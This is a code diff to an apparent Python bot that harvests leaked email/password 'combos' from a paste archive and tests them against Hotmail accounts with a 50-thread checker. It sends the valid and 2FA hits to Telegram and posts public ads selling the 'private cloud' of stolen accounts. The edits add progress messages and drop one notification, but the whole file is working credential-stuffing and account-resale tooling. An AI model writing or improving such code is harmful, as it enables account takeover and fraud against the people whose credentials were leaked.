@@ -33,7 +33,7 @@ TELEGRAM_PUBLIC_CHAT = os.environ["TELEGRAM_PUBLIC_CHAT"]
 OWNER_ID           = int(os.environ["OWNER_ID"])
 
 CHECK_INTERVAL   = 30
-CHECKER_THREADS  = 50  # threads for hotmail checker
+CHECKER_THREADS  = 50   # threads for hotmail checker
 PAGES_TO_SCAN    = 5
 ARCHIVE_URL      = "https://pasteview.com/paste-archive"
 SEEN_FILE        = "seen_urls.json"
@@ -146,21 +146,27 @@ def check_single(combo: str, proxies: list = []) -> tuple[str, str]:
         return (combo, "INVALID")
 
 
-async def check_combos(combos: list[str]) -> list[str]:
+async def check_combos(combos: list[str], status_msg=None) -> list[str]:
     """Run combos through checker in thread pool, return only valid hits."""
     if not combos:
         return []
     log.info(f"Checking {len(combos)} combos with {CHECKER_THREADS} threads...")
+    if status_msg:
+        try:
+            await status_msg.edit(content=f"🔄 Checking {len(combos)} combos...")
+        except Exception:
+            pass
     loop  = asyncio.get_event_loop()
-    valid = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
         futures = [loop.run_in_executor(pool, check_single, combo) for combo in combos]
         results = await asyncio.gather(*futures)
-    for combo, status in results:
-        if status in ("VALID", "2FA"):
-            valid.append(combo)
-            log.info(f"✓ HIT: {combo} [{status}]")
+    valid = [combo for combo, status in results if status in ("VALID", "2FA")]
     log.info(f"Checking done — {len(valid)}/{len(combos)} valid")
+    if status_msg:
+        try:
+            await status_msg.edit(content=f"✅ {len(valid)} valid hits found from {len(combos)} combos")
+        except Exception:
+            pass
     return valid
 
 
@@ -397,7 +403,11 @@ async def monitor_loop():
                         # Flatten all creds and check them
                         all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
                         log.info(f"Running {len(all_raw)} combos through checker...")
-                        valid_hits = await check_combos(all_raw)
+                        try:
+                            status_msg = await content_channel.send(f"🔄 Checking {len(all_raw)} combos...")
+                        except Exception:
+                            status_msg = None
+                        valid_hits = await check_combos(all_raw, status_msg=status_msg)
 
                         if not valid_hits:
                             log.info("No valid hits after checking, skipping post")
@@ -448,10 +458,6 @@ async def monitor_loop():
                             await send_telegram_file(tg_header + "\n".join(all_creds), filename)
 
                             async with aiohttp.ClientSession() as sess:
-                                await sess.post(
-                                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                                    json={"chat_id": TELEGRAM_CHAT, "text": f"{len(all_creds)} COMBO FILE"}
-                                )
                                 if toggles["telegram_public"]:
                                     pub_text = f"PRIVATE CLOUD UPDATED !\n-File name: {filename}\n-Lines: {len(all_creds)}\n-DM @XN9BOWNER TO BUY\n-WAR VOUCHES: @warvouchess"
                                     await sess.post(
